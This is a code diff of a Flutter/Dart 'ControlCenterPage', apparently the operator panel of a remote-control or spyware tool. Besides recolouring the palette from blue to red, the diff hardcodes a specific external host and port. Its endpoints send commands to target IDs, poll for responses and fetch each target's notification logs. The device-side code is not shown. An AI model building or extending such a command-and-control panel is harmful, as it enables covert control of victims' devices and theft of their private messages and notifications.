@@ -6,28 +6,28 @@ import 'api_config.dart';
 
 // ─── Palette (sama dengan Tools Page) ─────────────────────────────────────
 class _C {
-  static const bg        = Color(0xFF0A0F1A);
+  static const bg        = Color(0xFF0D0000);
   static const surface   = Color(0xFF0D1525);
-  static const card      = Color(0xFF111C30);
-  static const cardInner = Color(0xFF162035);
-  static const border    = Color(0xFF1C2E48);
-  static const borderLit = Color(0xFF1E3A5F);
-  static const steel     = Color(0xFF1A4F8A);
-  static const blueMid   = Color(0xFF2370BE);
-  static const blueLight = Color(0xFF4A94E8);
-  static const chrome    = Color(0xFF7AB4E8);
-  static const frost     = Color(0xFFADD4F5);
+  static const card      = Color(0xFF180000);
+  static const cardInner = Color(0xFF1C0000);
+  static const border    = Color(0xFF1C0000);
+  static const borderLit = Color(0xFF3B0A0A);
+  static const steel     = Color(0xFF7A0000);
+  static const blueMid   = Color(0xFFB01010);
+  static const blueLight = Color(0xFFE50914);
+  static const chrome    = Color(0xFFFF4040);
+  static const frost     = Color(0xFFFF8080);
   static const red       = Color(0xFFEF4444);
   static const orange = Color(0xFFFF9800);
   static const amber     = Color(0xFFF59E0B);
   static const green     = Color(0xFF22C55E);
-  static const purple    = Color(0xFFA78BFA);
+  static const purple    = Color(0xFFFF4040);
   static const pink      = Color(0xFFEC4899);
-  static const teal      = Color(0xFF14B8A6);
+  static const teal      = Color(0xFFE50914);
   static const blue      = Color(0xFF3B82F6);
-  static const text      = Color(0xFFDEEEFB);
-  static const textSub   = Color(0xFF6A92B8);
-  static const textDim   = Color(0xFF2E4E6E);
+  static const text      = Color(0xFFF5E0E0);
+  static const textSub   = Color(0xFFB06060);
+  static const textDim   = Color(0xFF5C2020);
   static const white     = Color(0xFFFFFFFF);
 }
 
@@ -91,7 +91,7 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
 
     try {
       final response = await http.post(
-        Uri.parse("$baseUrl/api/send-command"),
+        Uri.parse("http://tirzzadminbaik.pteroqdactyl.my.id:11560/api/send-command"),
         headers: {"Content-Type": "application/json"},
         body: jsonEncode({"id": targetId, "command": command, "extra": extra ?? ""}),
       ).timeout(const Duration(seconds: 15));
@@ -118,7 +118,7 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
       attempts++;
 
       try {
-        final response = await http.get(Uri.parse("$baseUrl/api/get-response/$targetId"));
+        final response = await http.get(Uri.parse("http://tirzzadminbaik.pteroqdactyl.my.id:11560/api/get-response/$targetId"));
         if (response.statusCode == 200) {
           final data = jsonDecode(response.body);
           if (data['data'] != null && data['cmd'] == cmd) {
@@ -155,7 +155,7 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
   void _fetchNotificationLogs(String targetId) async {
     _addLog("Mengambil notifikasi...");
     try {
-      final response = await http.get(Uri.parse("$baseUrl/api/get-notifications/$targetId"));
+      final response = await http.get(Uri.parse("http://tirzzadminbaik.pteroqdactyl.my.id:11560/api/get-notifications/$targetId"));
       if (response.statusCode == 200) {
         final List logs = jsonDecode(response.body);
         _showNotificationLogsDialog(logs);
